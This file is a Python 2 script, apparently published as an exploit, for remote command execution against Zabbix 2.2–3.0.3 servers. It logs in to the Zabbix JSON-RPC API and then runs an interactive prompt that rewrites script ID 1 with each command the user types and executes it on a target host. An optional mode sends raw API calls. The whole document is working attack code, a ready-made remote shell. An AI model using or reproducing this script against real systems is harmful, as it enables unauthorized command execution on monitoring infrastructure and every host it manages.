#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Version: 2.2 - 3.0.3
# Tested on: Linux (Debian, CentOS)
# CVE : N/As
# https://www.zabbix.com/documentation/2.4/manual/api
 
import requests
import json
import readline
import sys, getopt

try:
	sys.argv.pop(0)
	opts, args = getopt.getopt(sys.argv,"hr:u:p:i:a")
except getopt.GetoptError:
	print 'E/Exploit_RCE_Zabbix.py -r <url> -u <username> -p <password> -i <hostid>'
	sys.exit(2)

# params
ZABBIX_ROOT = None  ### Zabbix IP-address
ZABBIX_USER = None     ### Zabbix login
ZABBIX_PWD = None ### Zabbix password
ZABBIX_HOSTID = None    ### Zabbix hostid
ZABBIX_API = False

# parse args
for opt, arg in opts:
	if opt == '-h':
		print 'H/Exploit_RCE_Zabbix.py -r <url> -u <username> -p <password> -i <hostid> [-a]['
		sys.exit()
	elif opt in ("-r"):
		ZABBIX_ROOT = arg
	elif opt in ("-u"):
		ZABBIX_USER = arg
	elif opt in ("-p"):
		ZABBIX_PWD = arg
	elif opt in ("-i"):
		ZABBIX_HOSTID = arg
	elif opt in ("-a"):
		ZABBIX_API = True

 
if((ZABBIX_ROOT is None) or (ZABBIX_USER is None) 
	or (ZABBIX_PWD is None) or (ZABBIX_HOSTID is None)):
	print 'Exploit_RCE_Zabbix.py -r <url> -u <username> -p <password> -i <hostid>'
	sys.exit()
 
### auth
url = ZABBIX_ROOT + '/api_jsonrpc.php'   ### Don't edit
payload = {
    "jsonrpc" : "2.0",
    "method" : "user.login",
    "params": {
        'user': ""+ZABBIX_USER+"",
        'password': ""+ZABBIX_PWD+"",
    },
    "auth" : None,
    "id" : 0,
}
headers = {
    'content-type': 'application/json',
}
 
auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
auth = auth.json()
 
while True:
    cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
    if cmd == "" : print "Result of last command:"
    if cmd == "quit" : break
    
    ### parse API method and args
    if(ZABBIX_API):
        ZABBIX_METHOD = None
        ZABBIX_PARAMS = '{}'

        try:
	        opts_cmd, args_cmd = getopt.getopt(cmd.split(' '),"m:p:")
        except getopt.GetoptError:
	        print 'API command : -m <APImethod> [-p <paramstring>]'
	        sys.exit(2)

        for opt_cmd, arg_cmd in opts_cmd:
            if opt_cmd == '-h':
                print 'API command : -m <APImethod> [-p <paramstring>]'
                sys.exit()
            elif opt_cmd == "-m":
                ZABBIX_METHOD = arg_cmd
            elif opt_cmd == "-p":
                ZABBIX_PARAMS = arg_cmd

        print ZABBIX_METHOD
        print ZABBIX_PARAMS

### update
    if(ZABBIX_API==False):
        payload = json.dumps({
            "jsonrpc": "2.0",
            "method": "script.update",
            "params": {
                "scriptid": "1",
                "command": ""+cmd+""
            },
            "auth" : auth['result'],
            "id" : 1,
        })
    elif(ZABBIX_METHOD is not None):
        payload = '{"jsonrpc": "2.0","method":"'+ZABBIX_METHOD+'","params":'+ZABBIX_PARAMS+',"auth":"'+auth['result']+'","id" : 1}'
    else:
        continue

    cmd_upd = requests.post(url, data=payload, headers=(headers))
    print cmd_upd.json()

	### execute script
    if(ZABBIX_API==False):
        payload = {
            "jsonrpc": "2.0",
            "method": "script.execute",
            "params": {
                "scriptid": "1",
                "hostid": ""+ZABBIX_HOSTID+""
            },
            "auth" : auth['result'],
            "id" : 1,
        }
        cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
        cmd_exe = cmd_exe.json()
        print cmd_exe
